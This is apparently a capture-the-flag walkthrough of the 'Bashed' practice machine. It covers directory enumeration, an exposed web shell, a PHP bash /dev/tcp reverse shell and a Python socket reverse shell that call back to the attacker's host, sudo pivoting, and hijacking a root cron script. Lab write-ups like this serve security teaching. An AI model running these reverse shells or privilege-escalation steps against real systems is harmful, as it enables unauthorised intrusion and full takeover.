With GoBuster we identify the dev folder when phpbash console is located

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.68:80/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/28 20:18:17 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
Progress: 40298 / 87665 (45.97%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/07/28 20:24:52 Finished
```

Accesing to http://10.10.10.68/dev/phpbash.php we got a shell, and we can upload a php file with a reverse shell and a netcat listener we can upgrade our shell

```bash
shell.php 

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/1234 0>&1'");
?>
```

Through a python server (`python3 -m http.server 8000`) upload the shell.php file to the server (retrieve with `wget http://10.10.15.4:8000/shell.php`) and execute it (`php shell.php`). With a netcat listener we got a proper shell with user www-data

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.68] 55970
bash: cannot set terminal process group (809): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/tmp$ whoami
whoami
www-data
```

Upgrade TTY

With sudo -l we see than we can execute commands as scriptmanager

```bash
www-data@bashed

:/home/scriptmanager# sudo -l
  
Matching Defaults entries for www-data on bashed:  
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User www-data may run the following commands on bashed:  
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

So we can use `sudo -u scriptmanager <command>` to execute commands as scriptmanager. To get a shell as scriptmanager and avoid to execute `sudo -u scriptmanager` everytime we can reuse the shell.php file.

```bash
www-data@bashed:/tmp$ sudo -u scriptmanager php shell.php

----------------

┌──(kali㉿kali)-[~/Documents/Boxes/Bashed-10.10.10.68]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.68] 55972
scriptmanager@bashed:/tmp$ whoami
whoami
scriptmanager
```

After upgrade TTY again, we got a shell as scriptmanager

Checking folder with permisions (`ls -la`) we see the `/scripts` folder and inside we have an python script which creates the test.txt file, but test.txt file is owned by root

```bash
scriptmanager@bashed:/scripts$ ls -la
total 24
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jul 29 00:36 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager  219 Jul 29 00:40 test.py
-rw-r--r--  1 root          root            12 Jul 29 00:43 test.txt
```

If we execute the python script we can see that the test.txt file would be created again and the owner would be scriptmanager, but if we wait a minute the owner would change to root again. This is because a cron job executes the test.py script as root so lets create a python reverse shell and wait for the cron job to be executed as root

```bash

Reverse shell in python script:

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.5",1234));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);

---------------------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.68] 53002
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

And we are root